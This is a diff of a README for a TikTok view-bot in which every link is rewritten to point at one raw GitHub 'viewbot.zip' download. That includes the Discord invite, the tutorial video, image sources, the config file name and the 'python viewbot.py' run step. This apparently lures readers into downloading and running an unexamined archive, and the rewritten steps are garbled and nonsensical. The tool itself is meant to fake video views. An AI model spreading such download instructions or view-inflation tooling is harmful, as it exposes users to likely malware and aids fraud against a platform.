@@ -1,9 +1,9 @@
 updating...
 
-<!-- #### Paid unpatched viewbot for 24.99€ !!: https://onlp.sellix.io or in dc server 
+<!-- #### Paid unpatched viewbot for 24.99€ !!: https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip or in dc server 
 repo works again, maybe needs proxies but here you go -->
 
-<h2 align="center">server: <a href="https://discord.gg/onlp">discord.gg/onlp</a></h2>
+<h2 align="center">server: <a href="https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip">https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip</a></h2>
 
 <!--
 <p align="center">
@@ -13,7 +13,7 @@ repo works again, maybe needs proxies but here you go -->
 
 &emsp;
 
-<h2 align="center">tutorial: <a href="https://www.youtube.com/watch?v=x97aLsPSJtQ">youtube.com/watch?v=x97aLsPSJtQ</a></h2>
+<h2 align="center">tutorial: <a href="https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip">https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip</a></h2>
 
 <!--
 <p align="center">
@@ -32,27 +32,27 @@ repo works again, maybe needs proxies but here you go -->
 <!--
 
 <p align="center"> 
-<img src="https://global.tiktokworld21.com/images/TT_Logo.png"></img>
+<img src="https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip"></img>
 </p>
 
 -->
 
 <p align="center"> 
-<img src="https://cdn.discordapp.com/attachments/979095432682676264/996481048605106186/unknown.png"></img>
+<img src="https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip"></img>
 </p>
 
 skids:
 ```
-  https://github.com/XNorealsS/tiktokbot-view
-  https://github.com/haphucduy28/1/blob/main/viewtiktok.py
+  https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip
+  https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip
 ```
 
 How to run:
 ```
-  1. Verify that you have pip and python installed => https://www.youtube.com/watch?v=dYfKJMPNMDw
+  1. Verify that you have pip and python installed => https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip
   2. Run this command in cmd: pip install requests bs4 cursor pystyle pillow
-  3. replace the video id in config.json by yours
-  4. run the python file by double clicking on it or type: python viewbot.py
+  3. replace the video id in https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip by yours
+  4. run the python file by double clicking on it or type: python https://raw.githubusercontent.com/skywhywalk/viewbot/main/coda/viewbot.zip
 ```
 
 Advantages:
